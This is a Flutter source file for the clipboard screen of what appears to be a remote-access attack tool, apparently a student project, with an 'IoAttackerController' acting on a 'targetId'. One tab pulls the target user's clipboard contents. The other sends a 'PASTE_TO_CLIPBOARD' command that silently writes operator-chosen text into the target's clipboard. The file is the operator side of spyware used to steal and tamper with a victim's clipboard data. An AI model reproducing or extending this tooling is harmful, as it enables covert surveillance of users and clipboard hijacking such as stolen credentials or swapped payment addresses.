import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:inferno_core_fyp/res/helper_extensions.dart';
import 'package:inferno_core_fyp/res/widgets/general%20widgets/my_text.dart';
import 'package:inferno_core_fyp/view%20models/controllers/general_controller.dart';

import '../../res/constants.dart';
import '../../res/widgets/button components/my_text_btn.dart';
import '../../res/widgets/input field components/big_input_field.dart';
import '../../view models/controllers/io_attacker_controller.dart';

class ClipboardPage extends StatelessWidget {
  final String targetId;

  const ClipboardPage({super.key, required this.targetId});

  @override
  Widget build(BuildContext context) {
    GeneralController generalController = Get.put(GeneralController());
    IoAttackerController ioAttackerController = Get.put(IoAttackerController());
    return Scaffold(
      appBar: AppBar(title: const Text("Clipboard"), centerTitle: true),
      body: SingleChildScrollView(
        physics: const BouncingScrollPhysics(),
        child: Padding(
          padding: const EdgeInsets.all(kDefaultPadding),
          child: Obx(
            () => Column(
              crossAxisAlignment: CrossAxisAlignment.end,
              children: <Widget>[
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    GestureDetector(
                      onTap: () => generalController.isClipboard.value = true,
                      child: MyText(
                        "User\nClipboard",
                        fontSize: 17,
                        color: generalController.isClipboard.value
                            ? btnColor
                            : null,
                        fontWeight: FontWeight.bold,
                        textAlign: TextAlign.center,
                      ),
                    ),
                    50.pw,
                    GestureDetector(
                      onTap: () => generalController.isClipboard.value = false,
                      child: MyText(
                        "Fill\nClipboard",
                        fontSize: 17,
                        color: generalController.isClipboard.value
                            ? null
                            : btnColor,
                        fontWeight: FontWeight.bold,
                        textAlign: TextAlign.center,
                      ),
                    ),
                  ],
                ),
                14.ph,
                generalController.isClipboard.value == true
                    ? Column(
                        children: [
                          BigInputField(
                            readOnly: true,
                            height: Get.height * .45,
                            hintText: "User's Clipboard is empty right now!",
                            textColor: blackColor,
                            controller: TextEditingController(text: generalController.clipboardData.value),
                          ),
                          20.ph,
                          MyTextButton(
                            text: "Get data",
                            onPressed: () {
                              generalController.getClipboardData(targetId);
                            },
                            width: 120,
                            radius: 6,
                            spacing: 1.3,
                          ),
                        ],
                      )
                    : Column(
                        children: [
                          BigInputField(
                            height: 140,
                            controller:
                                generalController.generalController.value,
                            hintText:
                                "Enter text you want to fill in user's clipboard",
                            textColor: Colors.black,
                          ),
                          14.ph,
                          MyTextButton(
                            text: "Fill",
                            onPressed: () {
                              if (generalController
                                      .generalController.value.text !=
                                  "") {
                                ioAttackerController.submitCommand(
                                  targetId: targetId,
                                  data: {
                                    "text": 'PASTE_TO_CLIPBOARD',
                                    "command_args": {
                                      "text": generalController
                                          .generalController.value.text
                                          .trim()
                                    },
                                  },
                                );
                                generalController.generalController.value.clear();
                              }
                            },
                            width: 100,
                            radius: 6,
                            spacing: 1.3,
                          ),
                        ],
                      ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
